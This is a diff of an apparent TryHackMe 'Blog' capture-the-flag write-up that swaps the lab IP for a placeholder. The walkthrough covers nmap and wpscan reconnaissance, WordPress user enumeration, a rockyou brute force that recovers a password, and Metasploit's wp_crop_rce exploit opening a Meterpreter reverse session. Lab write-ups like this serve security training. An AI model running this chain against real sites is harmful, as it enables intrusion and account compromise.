@@ -14,9 +14,9 @@
 
 - Running Nmap
 ```bash
-nmap -sV 10.10.197.118 | tee nmap.output 
+nmap -sV <MACHINE_IP> | tee nmap.output 
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-16 16:19 IST
-Nmap scan report for blog.thm (10.10.197.118)
+Nmap scan report for blog.thm (<MACHINE_IP>)
 Host is up (0.18s latency).
 Not shown: 996 closed ports
 PORT    STATE SERVICE     VERSION
@@ -32,7 +32,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.63 seconds
 
 - Running wpscan along with user enumeration
 ```
-wpscan --url 10.10.197.118 --enumerate u
+wpscan --url <MACHINE_IP> --enumerate u
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -47,7 +47,7 @@ _______________________________________________________________
        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
 _______________________________________________________________
 
-[+] URL: http://10.10.197.118/ [10.10.197.118]
+[+] URL: http://<MACHINE_IP>/ [<MACHINE_IP>]
 [+] Started: Sat Jan 16 16:05:56 2021
 
 Interesting Finding(s):
@@ -57,14 +57,14 @@ Interesting Finding(s):
  | Found By: Headers (Passive Detection)
  | Confidence: 100%
 
-[+] robots.txt found: http://10.10.197.118/robots.txt
+[+] robots.txt found: http://<MACHINE_IP>/robots.txt
  | Interesting Entries:
  |  - /wp-admin/
  |  - /wp-admin/admin-ajax.php
  | Found By: Robots Txt (Aggressive Detection)
  | Confidence: 100%
 
-[+] XML-RPC seems to be enabled: http://10.10.197.118/xmlrpc.php
+[+] XML-RPC seems to be enabled: http://<MACHINE_IP>/xmlrpc.php
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 100%
  | References:
@@ -74,15 +74,15 @@ Interesting Finding(s):
  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
 
-[+] WordPress readme found: http://10.10.197.118/readme.html
+[+] WordPress readme found: http://<MACHINE_IP>/readme.html
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 100%
 
-[+] Upload directory has listing enabled: http://10.10.197.118/wp-content/uploads/
+[+] Upload directory has listing enabled: http://<MACHINE_IP>/wp-content/uploads/
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 100%
 
-[+] The external WP-Cron seems to be enabled: http://10.10.197.118/wp-cron.php
+[+] The external WP-Cron seems to be enabled: http://<MACHINE_IP>/wp-cron.php
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 60%
  | References:
@@ -91,9 +91,9 @@ Interesting Finding(s):
 
 [+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
  | Found By: Emoji Settings (Passive Detection)
- |  - http://10.10.197.118/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
+ |  - http://<MACHINE_IP>/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
  | Confirmed By: Meta Generator (Passive Detection)
- |  - http://10.10.197.118/, Match: 'WordPress 5.0'
+ |  - http://<MACHINE_IP>/, Match: 'WordPress 5.0'
 
 [i] The main theme could not be detected.
 
@@ -104,14 +104,14 @@ Interesting Finding(s):
 
 [+] bjoel
  | Found By: Wp Json Api (Aggressive Detection)
- |  - http://10.10.197.118/wp-json/wp/v2/users/?per_page=100&page=1
+ |  - http://<MACHINE_IP>/wp-json/wp/v2/users/?per_page=100&page=1
  | Confirmed By:
  |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
  |  Login Error Messages (Aggressive Detection)
 
 [+] kwheel
  | Found By: Wp Json Api (Aggressive Detection)
- |  - http://10.10.197.118/wp-json/wp/v2/users/?per_page=100&page=1
+ |  - http://<MACHINE_IP>/wp-json/wp/v2/users/?per_page=100&page=1
  | Confirmed By:
  |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
  |  Login Error Messages (Aggressive Detection)
@@ -136,7 +136,7 @@ Interesting Finding(s):
 
 - After finding the usernames, add the two usernames **kwheel**, **bjoel** to a text file and then perform **Password Bruteforcing** attack using wpscan.
 ```bash
-wpscan --url 10.10.197.118 -P /usr/share/wordlists/rockyou.txt -U users.txt
+wpscan --url <MACHINE_IP> -P /usr/share/wordlists/rockyou.txt -U users.txt
 [+] Performing password attack on Xmlrpc against 2 user/s
 [SUCCESS] - kwheel / cutiepie1                                                                                                                                                              
 ^Cying bjoel / cavalos Time: 00:42:01 <                                                                                                           > (30305 / 28691647)  0.10%  ETA: ??:??:??
@@ -176,8 +176,8 @@ Exploit target:
    --  ----
    0   WordPress
 
-msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS 10.10.197.118
-RHOSTS => 10.10.197.118
+msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS <MACHINE_IP>
+RHOSTS => <MACHINE_IP>
 msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD kwheel
 PASSWORD => kwheel
 msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD cutiepie1
@@ -190,7 +190,7 @@ Module options (exploit/multi/http/wp_crop_rce):
    ----       ---------------  --------  -----------
    PASSWORD   cutiepie1        yes       The WordPress password to authenticate with
    Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS     10.10.197.118    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RHOSTS     <MACHINE_IP>    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
    RPORT      80               yes       The target port (TCP)
    SSL        false            no        Negotiate SSL/TLS for outgoing connections
    TARGETURI  /                yes       The base path to the wordpress application
@@ -235,8 +235,8 @@ msf6 exploit(multi/http/wp_crop_rce) > exploit
 [*] Uploading payload
 [+] Image uploaded
 [*] Including into theme
-[*] Sending stage (39282 bytes) to 10.10.197.118
-[*] Meterpreter session 1 opened (<TRYHACKME_IP>:4444 -> 10.10.197.118:47098) at 2021-01-16 16:44:39 +0530
+[*] Sending stage (39282 bytes) to <MACHINE_IP>
+[*] Meterpreter session 1 opened (<TRYHACKME_IP>:4444 -> <MACHINE_IP>:47098) at 2021-01-16 16:44:39 +0530
 [*] Attempting to clean up files...
 
 meterpreter > pwd
